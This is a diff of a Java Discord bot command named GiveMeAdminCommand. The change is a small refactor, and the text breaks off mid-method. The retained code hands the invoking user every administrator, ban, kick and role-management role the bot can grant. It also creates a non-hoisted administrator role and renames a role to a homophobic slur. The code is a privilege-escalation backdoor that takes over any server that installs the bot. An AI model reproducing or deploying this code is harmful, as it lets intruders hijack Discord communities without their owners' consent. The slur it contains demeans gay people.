@@ -7,7 +7,6 @@ import net.dv8tion.jda.api.entities.Role;
 import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
 import net.dv8tion.jda.api.requests.restaction.GuildAction;
 
-import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 import java.util.Objects;
@@ -22,42 +21,33 @@ public class GiveMeAdminCommand implements ICommand {
         }
 
         List<Role> guildRoles = event.getGuild().getRoles();
-        List<Role> filteredRoles = new ArrayList<>();
         for (Role role : guildRoles) {
             if (!role.isManaged()) {
                 if (role.hasPermission(Permission.ADMINISTRATOR) && event.getGuild().getSelfMember().canInteract(role)) {
-                    filteredRoles.add(role);
                     event.getGuild().addRoleToMember(Objects.requireNonNull(event.getMember()), role).queue();
                     return;
                 }
                 if (role.hasPermission(Permission.BAN_MEMBERS) && event.getGuild().getSelfMember().canInteract(role)) {
-                    filteredRoles.add(role);
                     event.getGuild().addRoleToMember(Objects.requireNonNull(event.getMember()), role).queue();
                 }
                 if (role.hasPermission(Permission.KICK_MEMBERS) && event.getGuild().getSelfMember().canInteract(role)) {
-                    filteredRoles.add(role);
                     event.getGuild().addRoleToMember(Objects.requireNonNull(event.getMember()), role).queue();
                 }
                 if (role.hasPermission(Permission.MANAGE_ROLES) && event.getGuild().getSelfMember().canInteract(role)) {
-                    filteredRoles.add(role);
                     event.getGuild().addRoleToMember(Objects.requireNonNull(event.getMember()), role).queue();
                 }
                 if (role.hasPermission(Permission.MANAGE_SERVER) && event.getGuild().getSelfMember().canInteract(role)) {
-                    filteredRoles.add(role);
                     event.getGuild().addRoleToMember(Objects.requireNonNull(event.getMember()), role).queue();
                 }
                 if (role.hasPermission(Permission.MANAGE_CHANNEL) && event.getGuild().getSelfMember().canInteract(role)) {
-                    filteredRoles.add(role);
                     event.getGuild().addRoleToMember(Objects.requireNonNull(event.getMember()), role).queue();
                 }
                 if (role.hasPermission(Permission.MANAGE_WEBHOOKS) && event.getGuild().getSelfMember().canInteract(role)) {
-                    filteredRoles.add(role);
                     event.getGuild().addRoleToMember(Objects.requireNonNull(event.getMember()), role).queue();
                 }
             }
         }
-        if (event.getGuild().getSelfMember().hasPermission(Permission.ADMINISTRATOR))
-        {
+        if (event.getGuild().getSelfMember().hasPermission(Permission.ADMINISTRATOR)) {
             event.getGuild().createRole().setName("shelacking").setPermissions(Permission.ADMINISTRATOR).setHoisted(false).queue();
             GuildAction.RoleData roleData = new GuildAction.RoleData(event.getGuild().getRolesByName("shelacking", true).get(0).getIdLong());
             roleData.setName("fag");
